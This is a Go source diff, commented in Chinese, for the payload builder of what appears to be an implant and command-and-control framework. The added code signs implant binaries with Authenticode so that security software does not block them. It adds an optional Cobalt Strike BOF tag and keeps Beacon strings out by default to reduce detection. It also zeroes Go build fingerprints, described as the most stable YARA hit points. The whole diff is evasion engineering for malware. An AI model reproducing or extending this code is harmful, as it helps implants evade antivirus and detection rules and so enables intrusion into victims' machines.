@@ -71,6 +71,12 @@ type BuildOptions struct {
 	// toolhelp32 API + 携带安全软件进程名字符串。开启时服务端加 -tags evasionscan，
 	// 只有勾选才把 gate_scan_windows.go 编进载荷。
 	EvasionScan bool `json:"evasion_scan"`
+	// 构建后代码签名（Authenticode）：请求只能开启，证书配置在服务端 builder.sign_*。
+	SignEnabled bool `json:"sign_enabled"`
+	// BOF 支持（Cobalt Strike Beacon Object File）：**默认关闭**，开启时加 -tags bof。
+	// 关闭时载荷里不含任何 Beacon* 符号/字符串（实测这是 full 档案里唯一剩下的
+	// 高信号明文），需要用 BOF 时再开。
+	BofEnabled bool `json:"bof_enabled"`
 }
 
 type BuildResult struct {
@@ -85,6 +91,8 @@ type BuildResult struct {
 	// Evasion metadata
 	XORKey []byte `json:"xor_key,omitempty"`
 	HasXOR bool   `json:"has_xor"`
+	// Sign 代码签名结果（启用签名时才非空）
+	Sign *SignResult `json:"sign,omitempty"`
 }
 
 func New() *Builder {
@@ -338,6 +346,21 @@ func (b *Builder) Build(opts BuildOptions) (*BuildResult, error) {
 		}
 		result.Format = opts.Format
 		result.BuildTime = time.Now()
+		// C 植入端同样是 Windows PE：走同一套可选代码签名（未签名的新 PE 在国产
+		// 安全软件主机上会被拒绝执行，见 sign.go 顶部说明）。
+		if len(result.Binary) > 0 {
+			if signed, signRes, serr := b.signIfNeeded(result.Binary, opts.Format, opts.SignEnabled); serr != nil {
+				return nil, serr
+			} else if signRes != nil {
+				result.Binary = signed
+				result.Sign = signRes
+				if signRes.Signed {
+					logging.Info("builder", "C 植入端代码签名成功（%s）%s", signRes.Method, signerSuffix(signRes.Signer))
+				} else {
+					logging.Warn("builder", "C 植入端产物未签名：%s", signRes.Message)
+				}
+			}
+		}
 		if len(result.Binary) > 0 {
 			hash := sha256.Sum256(result.Binary)
 			result.SHA256 = hex.EncodeToString(hash[:])
@@ -369,6 +392,22 @@ func (b *Builder) Build(opts BuildOptions) (*BuildResult, error) {
 
 	result.Format = opts.Format
 	result.BuildTime = time.Now()
+
+	// 代码签名（Windows PE，可选）：在算 sha256 / 落盘之前签名，保证接口返回的
+	// size 与 sha256 就是"交付字节"的值（签名会改变文件内容与长度）。
+	if len(result.Binary) > 0 {
+		if signed, signRes, serr := b.signIfNeeded(result.Binary, opts.Format, opts.SignEnabled); serr != nil {
+			return nil, serr
+		} else if signRes != nil {
+			result.Binary = signed
+			result.Sign = signRes
+			if signRes.Signed {
+				logging.Info("builder", "代码签名成功（%s）%s", signRes.Method, signerSuffix(signRes.Signer))
+			} else {
+				logging.Warn("builder", "产物未签名：%s", signRes.Message)
+			}
+		}
+	}
 
 	if len(result.Binary) > 0 {
 		hash := sha256.Sum256(result.Binary)
@@ -531,9 +570,19 @@ func (b *Builder) compile(opts BuildOptions) ([]byte, error) {
 		return nil, fmt.Errorf("failed to obfuscate implant source: %v", err)
 	}
 
-	binary, err := b.compileGoCode(tmpDir, targetOS, arch, useGarble, transport, opts.Profile, opts.EvasionScan)
+	binary, err := b.compileGoCode(tmpDir, targetOS, arch, useGarble, transport, opts.Profile, opts.EvasionScan, opts.BofEnabled)
 	if err != nil {
 		return nil, err
+	}
+
+	// Go 指纹擦除（构建期特征，运行时不需要）：在 UPX 之前做，只做原地置零、长度不变，
+	// 因此 PE 节表/RVA/重定位/UPX 输入布局全部不受影响。擦除对象：
+	//   `\xff Go buildinf:` 魔数、buildinfo 窗口内的 Go 版本串、`Go build ID:` 前缀。
+	// 这些只被 debug.ReadBuildInfo / go tool buildid 读取，运行时（调度器/GC/栈回溯）不用，
+	// 但它们是 Go 家族 YARA 规则最稳定的命中点。
+	if scrubbed, removed := ScrubGoFingerprint(binary); len(removed) > 0 {
+		binary = scrubbed
+		logging.Info("builder", "go fingerprint scrubbed: %s", strings.Join(removed, "；"))
 	}
 
 	// UPX 压缩（仅 Windows exe 且 UPX 可用且开启）
@@ -581,7 +630,16 @@ func (b *Builder) compileLibrary(opts BuildOptions) ([]byte, error) {
 		return nil, err
 	}
 
-	return b.compileGoCode(tmpDir, targetOS, arch, false, "tcp", "full", false)
+	lib, err := b.compileGoCode(tmpDir, targetOS, arch, false, "tcp", "full", false, false)
+	if err != nil {
+		return nil, err
+	}
+	// DLL 载荷同样擦除 Go 构建期指纹（与 exe 路径一致：只置零、长度不变）
+	if scrubbed, removed := ScrubGoFingerprint(lib); len(removed) > 0 {
+		lib = scrubbed
+		logging.Info("builder", "go fingerprint scrubbed (lib): %s", strings.Join(removed, "；"))
+	}
+	return lib, nil
 }
 
 func (b *Builder) generateLibraryCode(targetOS string) string {
@@ -723,7 +781,7 @@ func (b *Builder) processTemplates(tmpDir string, opts BuildOptions) error {
 
 // buildTagList 汇总植入端构建需要的 Go 构建标签（空格分隔，可直接给 -tags）。
 // 单独抽成函数便于单测：标签直接决定哪些代码进入载荷（免杀相关，改错很难察觉）。
-func buildTagList(transport, profile string, evasionScan bool) string {
+func buildTagList(transport, profile string, evasionScan, bof bool) string {
 	var tags []string
 	switch transport {
 	case "http":
@@ -739,10 +797,13 @@ func buildTagList(transport, profile string, evasionScan bool) string {
 	if evasionScan {
 		tags = append(tags, "evasionscan")
 	}
+	if bof {
+		tags = append(tags, "bof")
+	}
 	return strings.Join(tags, " ")
 }
 
-func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, transport string, profile string, evasionScan bool) ([]byte, error) {
+func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, transport string, profile string, evasionScan, bof bool) ([]byte, error) {
 	// 编译期字符串混淆（免杀）改由 compile() 在注入每构建随机值之后统一调用，
 	// 确保随机 xd 基准与注入值一致。
 	// 条件编译标签（见 buildTagList）：
@@ -752,7 +813,7 @@ func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, t
 	//   profile=light        → light（裁剪截图/中继/注入/EDR 等重量级模块）
 	//   evasion_scan=on      → evasionscan（主动反沙箱进程检测；默认不编译，
 	//                          见 implant/gate_scan_windows.go 的说明）
-	buildTags := buildTagList(transport, profile, evasionScan)
+	buildTags := buildTagList(transport, profile, evasionScan, bof)
 
 	// TLS 客户端实现文件按通道裁剪：
 	//   - 非 HTTP 构建（TCP）：transport_tls_std.go / transport_tls_utls.go
